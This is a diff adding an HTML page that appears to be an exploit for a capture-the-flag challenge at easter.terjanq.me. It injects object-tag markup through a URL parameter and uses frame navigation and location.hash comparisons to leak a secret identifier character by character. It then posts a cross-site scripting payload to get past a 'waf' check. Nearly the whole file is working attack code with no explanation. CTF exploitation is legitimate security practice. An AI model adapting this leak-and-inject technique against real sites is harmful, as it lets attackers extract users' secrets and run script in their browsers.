@@ -1,0 +1,63 @@
+<html>
+    
+<body>
+    <iframe src="https://easter.terjanq.me" onload=start()></iframe>
+<script>
+
+const top_url = 'https://easter.terjanq.me?welcome=' + encodeURIComponent(`<object id=x data=${location.href}></object><object data=//${location.host}/aaa name=lload onload=/##/.source+identifier<location.hash+/0/.source&&!x.contentWindow.i_0.location++&&x.x.x,/##/.source+identifier<location.hash+/1/.source&&!x.contentWindow.i_1.location++&&x.x.x,/##/.source+identifier<location.hash+/2/.source&&!x.contentWindow.i_2.location++&&x.x.x,/##/.source+identifier<location.hash+/3/.source&&!x.contentWindow.i_3.location++&&x.x.x,/##/.source+identifier<location.hash+/4/.source&&!x.contentWindow.i_4.location++&&x.x.x,/##/.source+identifier<location.hash+/5/.source&&!x.contentWindow.i_5.location++&&x.x.x,/##/.source+identifier<location.hash+/6/.source&&!x.contentWindow.i_6.location++&&x.x.x,/##/.source+identifier<location.hash+/7/.source&&!x.contentWindow.i_7.location++&&x.x.x,/##/.source+identifier<location.hash+/8/.source&&!x.contentWindow.i_8.location++&&x.x.x,/##/.source+identifier<location.hash+/9/.source&&!x.contentWindow.i_9.location++&&x.x.x,/##/.source+identifier<location.hash+/a/.source&&!x.contentWindow.i_a.location++&&x.x.x,/##/.source+identifier<location.hash+/b/.source&&!x.contentWindow.i_b.location++&&x.x.x,/##/.source+identifier<location.hash+/c/.source&&!x.contentWindow.i_c.location++&&x.x.x,/##/.source+identifier<location.hash+/d/.source&&!x.contentWindow.i_d.location++&&x.x.x,/##/.source+identifier<location.hash+/e/.source&&!x.contentWindow.i_e.location++&&x.x.x,/##/.source+identifier<location.hash+/f/.source&&!x.contentWindow.i_f.location++&&x.x.x,/##/.source+identifier<location.hash+/g/.source&&!x.contentWindow.i_g.location++&&x.x.x,/##/.source+identifier<location.hash+/h/.source&&!x.contentWindow.i_h.location++&&x.x.x,/##/.source+identifier<location.hash+/i/.source&&!x.contentWindow.i_i.location++&&x.x.x,/##/.source+identifier<location.hash+/j/.source&&!x.contentWindow.i_j.location++&&x.x.x,/##/.source+identifier<location.hash+/k/.source&&!x.contentWindow.i_k.location++&&x.x.x,/##/.source+identifier<location.hash+/l/.source&&!x.contentWindow.i_l.location++&&x.x.x,/##/.source+identifier<location.hash+/m/.source&&!x.contentWindow.i_m.location++&&x.x.x,/##/.source+identifier<location.hash+/n/.source&&!x.contentWindow.i_n.location++&&x.x.x,/##/.source+identifier<location.hash+/o/.source&&!x.contentWindow.i_o.location++&&x.x.x,/##/.source+identifier<location.hash+/p/.source&&!x.contentWindow.i_p.location++&&x.x.x,/##/.source+identifier<location.hash+/q/.source&&!x.contentWindow.i_q.location++&&x.x.x,/##/.source+identifier<location.hash+/r/.source&&!x.contentWindow.i_r.location++&&x.x.x,/##/.source+identifier<location.hash+/s/.source&&!x.contentWindow.i_s.location++&&x.x.x,/##/.source+identifier<location.hash+/t/.source&&!x.contentWindow.i_t.location++&&x.x.x,/##/.source+identifier<location.hash+/u/.source&&!x.contentWindow.i_u.location++&&x.x.x,/##/.source+identifier<location.hash+/v/.source&&!x.contentWindow.i_v.location++&&x.x.x,/##/.source+identifier<location.hash+/w/.source&&!x.contentWindow.i_w.location++&&x.x.x,/##/.source+identifier<location.hash+/x/.source&&!x.contentWindow.i_x.location++&&x.x.x,/##/.source+identifier<location.hash+/y/.source&&!x.contentWindow.i_y.location++&&x.x.x,/##/.source+identifier<location.hash+/z/.source&&!x.contentWindow.i_z.location++></object>`);
+
+if(top !== window){
+    top.location = top_url + '##';
+}
+let identifier = '';
+
+const alph = "0123456789abcdefghijklmnopqrstuvwxyz"
+let iframes_counter = 0;
+function start(){
+    for(let c of alph){
+        let iframe = document.createElement('iframe');
+        iframe.name='i_'+c;
+        iframe.src = 'https://easter.terjanq.me'
+        document.body.appendChild(iframe);
+        iframe.onload=()=>{
+            if(!iframe.loaded){
+                iframe.loaded = 1;
+                iframes_counter++;
+                if(iframes_counter === 36){
+                    allIframesLoaded();
+                }
+            }else{
+                new_char(alph[alph.search(c)-1]);
+            }
+        }
+    }
+}
+
+function new_char(c){
+    if(c === undefined) {
+        solve(identifier);
+        return;
+    }
+    identifier += c;
+    console.log(identifier);
+    top.location = top_url + '##' + identifier;
+    top.lload.location=`//${location.host}/`;
+}
+
+function solve(identifier){
+    top.postMessage({
+        type: 'waf',
+        identifier,
+        str: '<iframe onload=alert(/123/)></iframe>',
+        safe: true
+    },'*')
+
+}
+
+function allIframesLoaded(){
+    top.lload.location=`//${location.host}/aaa`;
+}
+
+
+</script>
+</body></html>
